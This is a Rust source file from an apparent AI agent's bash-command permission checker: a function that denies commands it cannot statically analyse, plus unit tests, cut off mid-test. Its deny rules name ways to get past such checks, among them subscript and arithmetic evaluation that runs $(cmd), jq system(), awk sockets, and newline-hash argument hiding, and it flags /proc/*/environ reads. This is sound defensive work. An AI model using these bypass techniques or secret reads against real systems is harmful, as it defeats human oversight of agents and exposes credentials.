#[allow(dead_code)]
fn find_unquoted_glob(text: &str) -> bool {
    let b: Vec<char> = text.chars().collect();
    let n = b.len();
    let mut in_sq = false; // t: single quote
    let mut in_dq = false; // n: double quote
    let mut in_bt = false; // r: backtick
    let mut at_cmd_start = true; // o: at a command-start position (for `#`)
    let mut s = 0usize;
    while s < n {
        let c = b[s];
        if in_bt {
            if c == '\\' && matches!(b.get(s + 1), Some('`') | Some('\\') | Some('$')) {
                s += 2;
            } else {
                if c == '`' {
                    in_bt = false;
                }
                s += 1;
            }
        } else if in_sq {
            if c == '\'' {
                in_sq = false;
            }
            s += 1;
        } else if in_dq {
            if c == '\\' && matches!(b.get(s + 1), Some('"') | Some('\\') | Some('`')) {
                s += 2;
            } else if c == '`' {
                in_bt = true;
                s += 1;
            } else {
                if c == '"' {
                    in_dq = false;
                }
                s += 1;
            }
        } else if c == '\\' && s + 1 < n {
            if b[s + 1] != '\n' {
                at_cmd_start = false;
            }
            s += 2;
        } else if c == '#' && at_cmd_start {
            while s < n && b[s] != '\n' {
                s += 1;
            }
            at_cmd_start = true;
        } else if c == '`' {
            in_bt = true;
            at_cmd_start = false;
            s += 1;
        } else {
            if c == '*' || c == '?' || c == '[' {
                return true;
            }
            if c == '\'' {
                in_sq = true;
            } else if c == '"' {
                in_dq = true;
            }
            at_cmd_start = matches!(
                c,
                ' ' | '\t' | '\n' | ';' | '|' | '&' | '(' | ')' | '<' | '>'
            );
            s += 1;
        }
    }
    false
}

/// TS `checkSemantics` (2.1.195 binary `Mra`). Run the per-command name/argv
/// safety battery over the extracted [`SimpleCommand`]s. [`SemanticCheckResult::Ok`]
/// if nothing unsafe; [`SemanticCheckResult::Deny`] (fail-closed) otherwise.
/// Branch order and reason strings are byte-faithful to the 2.1.195 binary.
#[must_use]
#[allow(dead_code)]
pub(crate) fn check_semantics(commands: &[SimpleCommand]) -> SemanticCheckResult {
    // TS `t`: a deferred newline-hash verdict, returned only if no earlier check
    // produced an immediate Deny across ALL commands.
    let mut deferred: Option<String> = None;
    for cmd in commands {
        // Working argv (`r`), narrowed as safe command-prefix wrappers are stripped.
        let mut a: &[String] = &cmd.argv;
        // TS `o`: set once an `xargs <cmd>` wrapper is stripped — the wrapped
        // command receives stdin-appended arguments that cannot be statically
        // analyzed, so find/jq/awk reached this way are denied below.
        let mut through_xargs = false;
        // ── Strip command-prefix wrappers (path-aware): time/nohup/timeout/nice/
        // stdbuf/env/command/xargs (matched on the basename) + builtin/noglob (raw). ──
        loop {
            let raw0 = match a.first() {
                Some(s) => s.as_str(),
                None => break,
            };
            let base = raw0.rsplit(['/', '\\']).next().unwrap_or(raw0);
            let l = if matches!(
                base,
                "time" | "nohup" | "timeout" | "nice" | "stdbuf" | "env" | "command" | "xargs"
            ) {
                base
            } else {
                raw0
            };
            match l {
                "time" | "nohup" => {
                    a = &a[1..];
                }
                "timeout" => {
                    let mut c = 1usize;
                    while c < a.len() {
                        let u = a[c].as_str();
                        if u == "--foreground" || u == "--preserve-status" || u == "--verbose" {
                            c += 1;
                        } else if timeout_long_value_re().is_match(u) {
                            c += 1;
                        } else if (u == "--kill-after" || u == "--signal")
                            && a.get(c + 1).is_some_and(|v| timeout_value_re().is_match(v))
                        {
                            c += 2;
                        } else if u.starts_with("--") {
                            return SemanticCheckResult::Deny {
                                reason: format!(
                                    "timeout with {u} flag cannot be statically analyzed"
                                ),
                            };
                        } else if u == "-v" {
                            c += 1;
                        } else if (u == "-k" || u == "-s")
                            && a.get(c + 1).is_some_and(|v| timeout_value_re().is_match(v))
                        {
                            c += 2;
                        } else if timeout_ks_fused_re().is_match(u) {
                            c += 1;
                        } else if u.starts_with('-') {
                            return SemanticCheckResult::Deny {
                                reason: format!(
                                    "timeout with {u} flag cannot be statically analyzed"
                                ),
                            };
                        } else {
                            break;
                        }
                    }
                    match a.get(c) {
                        Some(dur) if timeout_duration_re().is_match(dur) => {
                            a = &a[c + 1..];
                        }
                        Some(dur) => {
                            return SemanticCheckResult::Deny {
                                reason: format!(
                                    "timeout duration '{dur}' cannot be statically analyzed"
                                ),
                            };
                        }
                        None => break,
                    }
                }
                "nice" => {
                    if a.get(1).map(String::as_str) == Some("-n")
                        && a.get(2).is_some_and(|v| nice_n_value_re().is_match(v))
                    {
                        a = &a[3..];
                    } else if a.get(1).is_some_and(|v| nice_legacy_re().is_match(v)) {
                        a = &a[2..];
                    } else if a.get(1).is_some_and(|v| {
                        nice_expansion_re().is_match(v) || contains_any_placeholder(v)
                    }) {
                        return SemanticCheckResult::Deny {
                            reason: format!(
                                "nice argument '{}' contains expansion \u{2014} cannot statically determine wrapped command",
                                a[1]
                            ),
                        };
                    } else {
                        a = &a[1..];
                    }
                }
                "env" => {
                    let mut c = 1usize;
                    while c < a.len() {
                        let u = a[c].as_str();
                        if u.contains('=') && !u.starts_with('-') {
                            c += 1;
                        } else if u == "-i" || u == "-0" || u == "-v" {
                            c += 1;
                        } else if u == "-u" && a.get(c + 1).is_some_and(|v| !v.is_empty()) {
                            // JS tests `r[c+1]` truthiness — an empty next arg is
                            // falsy → fall through to the unknown-flag Deny.
                            c += 2;
                        } else if u.starts_with('-') {
                            return SemanticCheckResult::Deny {
                                reason: format!("env with {u} flag cannot be statically analyzed"),
                            };
                        } else {
                            break;
                        }
                    }
                    if c < a.len() {
                        a = &a[c..];
                    } else {
                        break;
                    }
                }
                "stdbuf" => {
                    let mut c = 1usize;
                    while c < a.len() {
                        let u = a[c].as_str();
                        if stdbuf_short_sep_re().is_match(u)
                            && a.get(c + 1).is_some_and(|v| !v.is_empty())
                        {
                            // JS tests `r[c+1]` truthiness — empty next arg is falsy.
                            c += 2;
                        } else if stdbuf_short_fused_re().is_match(u) {
                            c += 1;
                        } else if stdbuf_long_re().is_match(u) {
                            c += 1;
                        } else if u.starts_with('-') {
                            return SemanticCheckResult::Deny {
                                reason: format!(
                                    "stdbuf with {u} flag cannot be statically analyzed"
                                ),
                            };
                        } else {
                            break;
                        }
                    }
                    if c > 1 && c < a.len() {
                        a = &a[c..];
                    } else {
                        break;
                    }
                }
                "command" => {
                    let mut c = 1usize;
                    let mut saw_v = false;
                    while c < a.len() && a[c].starts_with('-') && a[c] != "--" {
                        let d = a[c].as_str();
                        if !command_pvv_re().is_match(d) {
                            return SemanticCheckResult::Deny {
                                reason: format!(
                                    "command with {d} flag cannot be statically analyzed"
                                ),
                            };
                        }
                        if d.contains('v') || d.contains('V') {
                            saw_v = true;
                        }
                        c += 1;
                    }
                    if a.get(c).map(String::as_str) == Some("--") {
                        c += 1;
                    }
                    if saw_v || c >= a.len() {
                        break;
                    }
                    a = &a[c..];
                }
                "xargs" => {
                    // TS: strip `xargs` only when argv[1] exists and is not a
                    // flag (a bare `xargs -0`/`xargs` supplies no static command);
                    // set the through-xargs flag for the find/jq/awk denials.
                    if a.len() >= 2 && !a[1].starts_with('-') {
                        a = &a[1..];
                        through_xargs = true;
                    } else {
                        break;
                    }
                }
                _ => {
                    if raw0 == "builtin" || raw0 == "noglob" {
                        let c = if raw0 == "builtin" && a.get(1).map(String::as_str) == Some("--") {
                            2
                        } else {
                            1
                        };
                        if c < a.len() {
                            a = &a[c..];
                        } else {
                            break;
                        }
                    } else {
                        break;
                    }
                }
            }
        }

        // ── Command name (`o`). ──
        let o = match a.first() {
            Some(n) => n.as_str(),
            None => continue,
        };
        if o.is_empty() {
            return SemanticCheckResult::Deny {
                reason: "Empty command name \u{2014} argv[0] may not reflect what bash runs"
                    .to_string(),
            };
        }
        if contains_any_placeholder(o) {
            return SemanticCheckResult::Deny {
                reason: "Command name is runtime-determined (placeholder argv[0])".to_string(),
            };
        }
        if o.starts_with('-') || o.starts_with('|') || o.starts_with('&') {
            return SemanticCheckResult::Deny {
                reason: "Command appears to be an incomplete fragment".to_string(),
            };
        }

        // ── Subscript-eval flag builtins (`uoo`). ──
        let is_test = o == "test" || o == "[" || o == "[[";
        if let Some(flags) = SUBSCRIPT_EVAL_FLAGS
            .iter()
            .find(|(k, _)| *k == o)
            .map(|(_, v)| *v)
        {
            for ai in 1..a.len() {
                let l = a[ai].as_str();
                let c = a.get(ai + 1).map(String::as_str);
                if flags.contains(&l)
                    && c.is_some_and(|c| c.contains('[') || contains_any_placeholder(c))
                {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "'{o} {l}' operand contains array subscript or runtime-determined value \u{2014} bash evaluates $(cmd) in subscripts"
                        ),
                    };
                }
                if is_test {
                    if l == "-t" && c.is_some_and(|c| !numeric_arith_re().is_match(c)) {
                        return SemanticCheckResult::Deny {
                            reason: format!(
                                "'{o} -t' operand is non-numeric \u{2014} zsh arith-evals identifiers (may run $(cmd))"
                            ),
                        };
                    }
                    continue;
                }
                let lb = l.as_bytes();
                // Combined short flags (`-rv name[…]`): inspect the NEXT arg.
                if l.len() > 2 && lb[0] == b'-' && lb[1] != b'-' && !l.contains('[') {
                    for u in flags {
                        if u.len() == 2
                            && l.contains(&u[1..2])
                            && a.get(ai + 1)
                                .is_some_and(|d| d.contains('[') || contains_any_placeholder(d))
                        {
                            return SemanticCheckResult::Deny {
                                reason: format!(
                                    "'{o} {u}' (combined in '{l}') operand contains array subscript \u{2014} bash evaluates $(cmd) in subscripts"
                                ),
                            };
                        }
                    }
                }
                // Fused form (`-vname[…]`): inspect WITHIN the flag arg.
                if l.len() > 2 && lb[0] == b'-' && o != "read" {
                    for u in flags {
                        if u.len() != 2 {
                            continue;
                        }
                        let uc = &u[1..2];
                        let d = match l[1..].find(uc) {
                            Some(idx) => idx + 1,
                            None => continue,
                        };
                        if d == l.len() - 1 {
                            continue;
                        }
                        let p = &l[d + 1..];
                        if ident_subscript_re().is_match(p) || contains_any_placeholder(p) {
                            return SemanticCheckResult::Deny {
                                reason: format!(
                                    "'{o} {u}' (fused in '{l}') operand contains array subscript \u{2014} bash evaluates $(cmd) in subscripts"
                                ),
                            };
                        }
                    }
                }
            }
        }

        // ── `[[ X OP Y ]]` arithmetic comparison: operands are arith-evaluated. ──
        if is_test {
            for ai in 2..a.len() {
                if !TEST_ARITH_CMP_OPS.contains(&a[ai].as_str()) {
                    continue;
                }
                for nb in [a.get(ai - 1), a.get(ai + 1)] {
                    let Some(nb) = nb else { continue };
                    if nb.contains('[') || !numeric_arith_re().is_match(nb) {
                        return SemanticCheckResult::Deny {
                            reason: format!(
                                "'{o} ... {} ...' operand is non-numeric \u{2014} `[[` arithmetically evaluates identifiers/subscripts (may run $(cmd))",
                                a[ai]
                            ),
                        };
                    }
                }
            }
        }

        // ── `read`/`unset` NAME operands (with the zsh-aware read flag machine). ──
        if BARE_SUBSCRIPT_NAME_BUILTINS.contains(&o) {
            #[derive(PartialEq)]
            enum St {
                None,
                Numeric,
                Prompt,
                Str,
            }
            let mut state = St::None;
            for li in 1..a.len() {
                let c = a[li].as_str();
                if state != St::None {
                    let u = std::mem::replace(&mut state, St::None);
                    if u == St::Numeric && !read_numeric_re().is_match(c) {
                        return SemanticCheckResult::Deny {
                            reason: format!(
                                "'read {}' operand '{c}' is non-numeric \u{2014} zsh arith-evals subscripts/expressions (may run $(cmd))",
                                a[li - 1]
                            ),
                        };
                    }
                    if u == St::Prompt
                        && (subscripted_name_re().is_match(c)
                            || (c.starts_with('-') && ident_subscript_re().is_match(c))
                            || c.contains(CMDSUB_PLACEHOLDER))
                    {
                        return SemanticCheckResult::Deny {
                            reason: format!(
                                "'read {}' operand '{c}' is a subscripted NAME, dash-prefixed with a subscript, or runtime-determined \u{2014} zsh -p takes no operand; may arith-eval the subscript and run $(cmd)",
                                a[li - 1]
                            ),
                        };
                    }
                    continue;
                }
                if c.starts_with('-') {
                    if o == "read" {
                        if READ_NUMERIC_DATA_FLAGS.contains(&c) {
                            state = St::Numeric;
                        } else if c == "-p" {
                            state = St::Prompt;
                        } else if READ_DATA_FLAGS.contains(&c) {
                            state = St::Str;
                        } else if c.len() > 2 {
                            let cc: Vec<char> = c.chars().collect();
                            for ui in 1..cc.len() {
                                let d = format!("-{}", cc[ui]);
                                let p = READ_NUMERIC_DATA_FLAGS.contains(&d.as_str());
                                if p || READ_DATA_FLAGS.contains(&d.as_str()) {
                                    if ui == cc.len() - 1 {
                                        state = if p {
                                            St::Numeric
                                        } else if d == "-p" {
                                            St::Prompt
                                        } else {
                                            St::Str
                                        };
                                    } else {
                                        let rest: String = cc[ui + 1..].iter().collect();
                                        if p && !read_numeric_re().is_match(&rest) {
                                            return SemanticCheckResult::Deny {
                                                reason: format!(
                                                    "'read {d}' (fused in '{c}') operand is non-numeric \u{2014} zsh arith-evals subscripts/expressions (may run $(cmd))"
                                                ),
                                            };
                                        } else if d == "-p" {
                                            let m: String = cc[ui + 1..].iter().collect();
                                            if ident_subscript_re().is_match(&m)
                                                || m.contains(CMDSUB_PLACEHOLDER)
                                            {
                                                return SemanticCheckResult::Deny {
                                                    reason: format!(
                                                        "'read -p' fused remainder '{m}' contains a subscripted identifier or cmdsub \u{2014} on zsh (-p is no-arg) this may reach matheval via a following option and run $(cmd)"
                                                    ),
                                                };
                                            }
                                        }
                                        break;
                                    }
                                    break;
                                }
                            }
                        }
                    }
                    continue;
                }
                if c.contains('[') || contains_any_placeholder(c) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "'{o}' positional NAME '{c}' contains array subscript or runtime-determined value \u{2014} bash evaluates $(cmd) in subscripts"
                        ),
                    };
                }
            }
        }

        // ── declare/typeset/local/export/readonly/private/print/set/… family. ──
        if DECLARE_FAMILY.contains(&o) {
            let is_dtl = o == "declare" || o == "typeset" || o == "local";
            let is_dtler = is_dtl || o == "export" || o == "readonly";
            for ci in 1..a.len() {
                let u = a[ci].as_str();
                if is_dtl && declare_niaAEF_re().is_match(u) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "'{o}' with -n/-i/-a/-A/-E/-F flag (reached as plain command via wrapper/quote) changes assignment eval semantics"
                        ),
                    };
                }
                if ZSH_TYPESET_FAMILY.contains(&o) && declare_iEF_re().is_match(u) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "'{o}' with -i/-E/-F flag (reached as plain command via wrapper/quote) \u{2014} zsh bin_typeset mathevals the RHS"
                        ),
                    };
                }
                if (is_dtler || o == "private") && declare_m_re().is_match(u) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "'{o}' with -m/+m flag (reached as plain command via wrapper/quote) \u{2014} zsh pattern-assigns every matching variable"
                        ),
                    };
                }
                if ZSH_TYPESET_FAMILY.contains(&o) && declare_T_re().is_match(u) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "'{o} -T' creates a user-defined zsh tied pair \u{2014} tracked literals for its operands are unreliable"
                        ),
                    };
                }
                let d = u.contains('[') && subscript_expansion_re().is_match(u);
                if d || contains_any_placeholder(u) {
                    return SemanticCheckResult::Deny {
                        reason: if d {
                            format!(
                                "'{o}' operand '{}' contains array subscript with expansion \u{2014} shell arith-evals $(cmd) in subscripts",
                                a1n_display(u)
                            )
                        } else {
                            format!(
                                "'{o}' operand '{}' is runtime-determined and may carry an array subscript \u{2014} shell arith-evals $(cmd) in subscripts",
                                a1n_display(u)
                            )
                        },
                    };
                }
                if (o == "float" || o == "integer") && !leading_sign_re().is_match(u) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "zsh '{o}' operand \u{2014} implicit typeset -E/-i arithmetically evaluates the (existing or assigned) value"
                        ),
                    };
                }
            }
        }

        // ── printf: %d/%i operands are arith-evaluated on zsh. ──
        if o == "printf" {
            for ai in 1..a.len() {
                let l = a[ai].as_str();
                let c = l.contains('[') && subscript_expansion_re().is_match(l);
                if c || contains_any_placeholder(l) {
                    return SemanticCheckResult::Deny {
                        reason: if c {
                            format!(
                                "printf operand '{}' contains array subscript with expansion \u{2014} zsh arith-evals %d/%i operands (may run $(cmd))",
                                a1n_display(l)
                            )
                        } else {
                            format!(
                                "printf operand '{}' is runtime-determined and may carry an array subscript \u{2014} zsh arith-evals %d/%i operands (may run $(cmd))",
                                a1n_display(l)
                            )
                        },
                    };
                }
            }
        }

        // ── set -o/+o <opt> and set -<letter>: shell option changes. ──
        if o == "set" {
            let mut ai = 1usize;
            while ai < a.len() {
                let l = a[ai].as_str();
                if l == "--" {
                    break;
                }
                if !set_flag_re().is_match(l) {
                    ai += 1;
                    continue;
                }
                let cc: Vec<char> = l.chars().collect();
                let mut ci = 1usize;
                while ci < cc.len() {
                    let u = cc[ci];
                    if u == 'o' {
                        let d: Option<String> = if ci < cc.len() - 1 {
                            Some(cc[ci + 1..].iter().collect())
                        } else {
                            a.get(ai + 1).map(|s| s.to_string())
                        };
                        if let Some(d) = d.as_deref() {
                            if !d.is_empty()
                                && !SET_O_SAFE
                                    .contains(&d.to_lowercase().replace(['_', '-'], "").as_str())
                            {
                                return SemanticCheckResult::Deny {
                                    reason: format!(
                                        "'set -o/+o {d}' changes shell parsing/globbing state \u{2014} can enable globsubst/extendedglob and defeat static analysis"
                                    ),
                                };
                            }
                        }
                        if ci == cc.len() - 1 {
                            ai += 1;
                        }
                        break;
                    }
                    if u == 'A' {
                        break;
                    }
                    if !SET_SAFE_LETTERS.contains(&u.to_string().as_str()) {
                        return SemanticCheckResult::Deny {
                            reason: format!(
                                "'set {}{u}' changes shell option state (allexport/keyword/\u{2026}) \u{2014} defeats static env-var analysis; see SET_O_SAFE_LETTERS",
                                cc[0]
                            ),
                        };
                    }
                    ci += 1;
                }
                ai += 1;
            }
        }

        // ── print -P: zsh prompt expansion evaluates $(cmd). ──
        if o == "print" && a.iter().any(|x| print_p_flag_re().is_match(x)) {
            for ai in 1..a.len() {
                let l = a[ai].as_str();
                if cmdsub_or_backtick_re().is_match(l) || contains_any_placeholder(l) {
                    return SemanticCheckResult::Deny {
                        reason: "'print -P' operand contains command substitution \u{2014} zsh prompt expansion evaluates $(cmd)".to_string(),
                    };
                }
            }
        }

        // ── jobs -x: executes its argument. ──
        if o == "jobs" {
            for ai in 1..a.len() {
                if jobs_x_re().is_match(&a[ai]) {
                    return SemanticCheckResult::Deny {
                        reason: "'jobs -x' executes its argument as a command \u{2014} cannot be statically analyzed".to_string(),
                    };
                }
            }
        }

        // ── shell reserved keyword as command name: tree-sitter mis-parse. ──
        if SHELL_KEYWORDS.contains(&o) {
            return SemanticCheckResult::Deny {
                reason: format!(
                    "Shell keyword '{o}' as command name \u{2014} tree-sitter mis-parse"
                ),
            };
        }

        // ── through-xargs: stdin-appended arguments defeat static analysis. ──
        if through_xargs {
            if o == "find" || o == "jq" {
                return SemanticCheckResult::Deny {
                    reason: format!(
                        "{o} through xargs \u{2014} stdin-appended arguments cannot be statically analyzed"
                    ),
                };
            }
            if AWK_COMMANDS.contains(&o) {
                // Does the awk invocation carry a STATIC program (a non-flag arg,
                // a bare `-`, or a value after `--`)? If not, xargs may supply the
                // program text itself.
                let mut has_static_program = false;
                let mut c = 1usize;
                while c < a.len() {
                    let u = a[c].as_str();
                    if u == "--" {
                        has_static_program = c + 1 < a.len();
                        break;
                    }
                    if u == "-" || !u.starts_with('-') {
                        has_static_program = true;
                        break;
                    }
                    // A value-consuming flag skips its following value.
                    if !u.contains('=') && awk_xargs_value_flag_re().is_match(u) {
                        c += 1;
                    }
                    c += 1;
                }
                if !has_static_program {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "{o} through xargs with no static program \u{2014} stdin-supplied program text cannot be statically analyzed"
                        ),
                    };
                }
            }
        }

        // ── awk/gawk/mawk/nawk: system(), pipes, @load/@include, extensions,
        //    /inet sockets, runtime-determined args, program-supplying flags. ──
        if AWK_COMMANDS.contains(&o) {
            if find_unquoted_glob(&cmd.text) {
                return SemanticCheckResult::Deny {
                    reason: "awk command contains unquoted glob characters \u{2014} could glob-expand to a planted program or flag before awk runs".to_string(),
                };
            }
            for l in a {
                if let Some(reason) = yvc_awk_program(l) {
                    return SemanticCheckResult::Deny {
                        reason: reason.to_string(),
                    };
                }
                if contains_any_placeholder(l) {
                    return SemanticCheckResult::Deny {
                        reason: "awk argument is runtime-determined \u{2014} substituted text becomes awk code and cannot be statically analyzed".to_string(),
                    };
                }
            }
            if a.iter().any(|l| {
                awk_program_flag_short_re().is_match(l) || awk_program_flag_long_re().is_match(l)
            }) {
                return SemanticCheckResult::Deny {
                    reason: "awk command uses flags that read the program from a file, load extensions, or supply program fragments \u{2014} cannot be statically analyzed".to_string(),
                };
            }
        }

        // ── jq: system(), include/import, and code/file-reading flags. ──
        if o == "jq" {
            for arg in a {
                if jq_system_re().is_match(arg) {
                    return SemanticCheckResult::Deny {
                        reason: "jq command contains system() function which executes arbitrary commands".to_string(),
                    };
                }
                if jq_include_re().is_match(arg) {
                    return SemanticCheckResult::Deny {
                        reason: "jq command contains include/import \u{2014} modules can load arbitrary .jq files via {search:\".\"} and call env or other builtins".to_string(),
                    };
                }
            }
            if a.iter().any(|arg| jq_dangerous_flags_re().is_match(arg)) {
                return SemanticCheckResult::Deny {
                    reason: "jq command contains dangerous flags that could execute code or read arbitrary files".to_string(),
                };
            }
        }

        // ── find: action primaries + unquoted globs that could glob-expand. ──
        if o == "find" {
            if find_unquoted_glob(&cmd.text) {
                return SemanticCheckResult::Deny {
                    reason: "find contains unquoted glob characters \u{2014} could glob-expand to a dangerous action before find runs".to_string(),
                };
            }
            let mut ai = 1usize;
            while ai < a.len() {
                let l = a[ai].as_str();
                if FIND_ACTION_FLAGS.contains(&l) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "find with '{l}' executes commands or modifies files \u{2014} cannot be auto-allowed by a Bash(find:*) prefix rule"
                        ),
                    };
                }
                if FIND_VALUE_FLAGS.contains(&l) || find_newer_re().is_match(l) {
                    ai += 2;
                    continue;
                }
                if contains_any_placeholder(l) {
                    return SemanticCheckResult::Deny {
                        reason: "find argument is runtime-determined \u{2014} could resolve to a dangerous action".to_string(),
                    };
                }
                if find_glob_re().is_match(l) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "find argument '{l}' contains glob characters \u{2014} could glob-expand to a dangerous action"
                        ),
                    };
                }
                ai += 1;
            }
        }

        // ── zsh module/dangerous builtins (name-based). ──
        if ZSH_DANGEROUS_BUILTINS.contains(&o) {
            return SemanticCheckResult::Deny {
                reason: format!("Zsh builtin '{o}' can bypass security checks"),
            };
        }

        // ── eval-like builtins (with fc/compgen list-only carve-outs). ──
        if EVAL_LIKE_BUILTINS.contains(&o) {
            if o == "fc" && !a.iter().skip(1).any(|x| fc_exec_re().is_match(x)) {
                // `fc -l` (list history) — safe.
            } else if o == "compgen" && !a.iter().skip(1).any(|x| compgen_exec_re().is_match(x)) {
                // `compgen -v` (list completions) — safe.
            } else {
                return SemanticCheckResult::Deny {
                    reason: format!("'{o}' evaluates arguments as shell code"),
                };
            }
        }

        // ── commands that run their argument as a command (watch/flock/…). ──
        if RUNS_ARG_COMMANDS.contains(&o) && a.len() > 1 {
            return SemanticCheckResult::Deny {
                reason: format!(
                    "'{o}' runs its argument as a command \u{2014} cannot be statically analyzed"
                ),
            };
        }

        // ── /proc/*/environ access (argv + redirect targets). ──
        for arg in &cmd.argv {
            if arg.contains("/proc/") && proc_environ_re().is_match(arg) {
                return SemanticCheckResult::Deny {
                    reason: "Accesses /proc/*/environ which may expose secrets".to_string(),
                };
            }
        }
        for r in &cmd.redirects {
            if r.target.contains("/proc/") && proc_environ_re().is_match(&r.target) {
                return SemanticCheckResult::Deny {
                    reason: "Accesses /proc/*/environ which may expose secrets".to_string(),
                };
            }
        }

        // ── newline-`#` hiding (DEFERRED — only returned if nothing else denied). ──
        for arg in &cmd.argv {
            if arg.contains('\n') && newline_hash_re().is_match(arg) {
                deferred.get_or_insert_with(|| {
                    "Newline followed by # inside a quoted argument can hide arguments from path validation".to_string()
                });
            }
        }
        for ev in &cmd.env_vars {
            if ev.1.contains('\n') && newline_hash_re().is_match(&ev.1) {
                deferred.get_or_insert_with(|| {
                    "Newline followed by # inside an env var value can hide arguments from path validation".to_string()
                });
            }
        }
        for r in &cmd.redirects {
            if r.target.contains('\n') && newline_hash_re().is_match(&r.target) {
                deferred.get_or_insert_with(|| {
                    "Newline followed by # inside a redirect target can hide arguments from path validation".to_string()
                });
            }
        }
    }
    if let Some(reason) = deferred {
        return SemanticCheckResult::Deny { reason };
    }
    SemanticCheckResult::Ok
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── L1: const sets + leaf helpers ──

    #[test]
    fn node_type_id_pre_check_and_error() {
        assert_eq!(node_type_id(None), -2);
        assert_eq!(node_type_id(Some("ERROR")), -1);
    }

    #[test]
    fn node_type_id_dangerous_index_plus_one() {
        // Insertion order from DANGEROUS_TYPES (ast.ts:186): index+1.
        assert_eq!(node_type_id(Some("command_substitution")), 1);
        assert_eq!(node_type_id(Some("process_substitution")), 2);
        assert_eq!(node_type_id(Some("simple_expansion")), 4);
        assert_eq!(node_type_id(Some("heredoc_redirect")), 18);
        // Verify the slice is exactly 18 long and the last id matches.
        assert_eq!(DANGEROUS_TYPES.len(), 18);
        assert_eq!(
            node_type_id(Some(DANGEROUS_TYPES[DANGEROUS_TYPES.len() - 1])),
            DANGEROUS_TYPES.len() as i32
        );
    }

    #[test]
    fn node_type_id_unknown_is_zero() {
        assert_eq!(node_type_id(Some("command")), 0);
        assert_eq!(node_type_id(Some("word")), 0);
    }

    #[test]
    fn contains_any_placeholder_is_substring() {
        assert!(contains_any_placeholder(CMDSUB_PLACEHOLDER));
        assert!(contains_any_placeholder(VAR_PLACEHOLDER));
        // SUBSTRING, not equality — composites must be caught.
        assert!(contains_any_placeholder("prefix__CMDSUB_OUTPUT__"));
        assert!(contains_any_placeholder("/etc__TRACKED_VAR__suffix"));
        assert!(!contains_any_placeholder("/etc/passwd"));
        assert!(!contains_any_placeholder(""));
    }

    #[test]
    fn strip_raw_string_drops_surrounding_quotes() {
        assert_eq!(strip_raw_string("'/etc'"), "/etc");
        assert_eq!(strip_raw_string("''"), "");
        // Panic-free on a <2-char input (TS slice(1,-1) yields "").
        assert_eq!(strip_raw_string("'"), "");
        assert_eq!(strip_raw_string(""), "");
    }

    #[test]
    fn apply_var_to_scope_set_append_and_placeholder() {
        let mut scope: HashMap<String, String> = HashMap::new();
        apply_var_to_scope(&mut scope, "VAR", "/etc", false);
        assert_eq!(scope.get("VAR").map(String::as_str), Some("/etc"));
        // Append concatenates.
        apply_var_to_scope(&mut scope, "VAR", "/passwd", true);
        assert_eq!(scope.get("VAR").map(String::as_str), Some("/etc/passwd"));
        // Append of a placeholder taints the combined value.
        apply_var_to_scope(&mut scope, "VAR", CMDSUB_PLACEHOLDER, true);
        assert_eq!(scope.get("VAR").map(String::as_str), Some(VAR_PLACEHOLDER));
        // A fresh set of a literal clears the taint.
        apply_var_to_scope(&mut scope, "VAR", "/tmp", false);
        assert_eq!(scope.get("VAR").map(String::as_str), Some("/tmp"));
    }

    // resolve_simple_expansion + too_complex are exercised through the parser:
    // build a real `simple_expansion` node and resolve it against a scope.
    fn resolve(cmd: &str, scope: &HashMap<String, String>, inside: bool) -> Result<String, String> {
        let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
        let src = cmd.as_bytes();
        let node = find_kind(tree.root_node(), "simple_expansion").expect("simple_expansion node");
        match resolve_simple_expansion(node, src, scope, inside) {
            Ok(s) => Ok(s),
            Err(ParseForSecurityResult::TooComplex { reason }) => Err(reason),
            Err(other) => panic!("unexpected verdict {other:?}"),
        }
    }

    fn find_kind<'a>(node: Node<'a>, kind: &str) -> Option<Node<'a>> {
        if node.kind() == kind {
            return Some(node);
        }
        let mut cursor = node.walk();
        for c in node.children(&mut cursor) {
            if let Some(found) = find_kind(c, kind) {
                return Some(found);
            }
        }
        None
    }

    #[test]
    fn resolve_tracked_literal_bare_returns_value() {
        let mut scope = HashMap::new();
        scope.insert("VAR".to_string(), "/etc".to_string());
        // Bare $VAR → the REAL literal (so path validation sees /etc).
        assert_eq!(resolve("echo $VAR", &scope, false), Ok("/etc".to_string()));
    }

    #[test]
    fn resolve_tracked_literal_bare_unsafe_rejects() {
        let mut scope = HashMap::new();
        // Glob char: word-splitting / globbing would change argv → reject bare.
        scope.insert("VAR".to_string(), "/etc/*".to_string());
        assert!(resolve("cat $VAR", &scope, false).is_err());
        // Empty bare arg disappears under word-splitting → reject.
        scope.insert("E".to_string(), String::new());
        assert!(resolve("ls $E", &scope, false).is_err());
    }

    #[test]
    fn resolve_tracked_placeholder_inside_string_vs_bare() {
        let mut scope = HashMap::new();
        scope.insert("V".to_string(), VAR_PLACEHOLDER.to_string());
        // Bare → reject; inside string → VAR_PLACEHOLDER.
        assert!(resolve("echo $V", &scope, false).is_err());
        assert_eq!(
            resolve(r#"echo "$V""#, &scope, true),
            Ok(VAR_PLACEHOLDER.to_string())
        );
    }

    #[test]
    fn resolve_untracked_safe_env_only_inside_string() {
        let scope = HashMap::new();
        // 2.1.211: untracked $HOME resolves to the REAL home directory (bare and
        // inside-string alike); bare additionally rejects an empty / unsafe value.
        let home = std::env::var("HOME").unwrap_or_default();
        let bare = resolve("ls $HOME", &scope, false);
        if home.is_empty() || bare_var_unsafe_re().is_match(&home) {
            assert!(bare.is_err());
        } else {
            assert_eq!(bare, Ok(home.clone()));
        }
        assert_eq!(resolve(r#"echo "$HOME""#, &scope, true), Ok(home));
        // IFS only safe inside a string (bare $IFS is the injection primitive).
        assert!(resolve("echo $IFS", &scope, false).is_err());
        assert_eq!(
            resolve(r#"echo "$IFS""#, &scope, true),
            Ok(VAR_PLACEHOLDER.to_string())
        );
    }

    #[test]
    fn resolve_special_and_positional_inside_string() {
        let scope = HashMap::new();
        // $? special var, inside a string → placeholder (grammar tags it
        // `special_variable_name`, so `is_special` is true → SPECIAL_VAR_NAMES).
        assert_eq!(
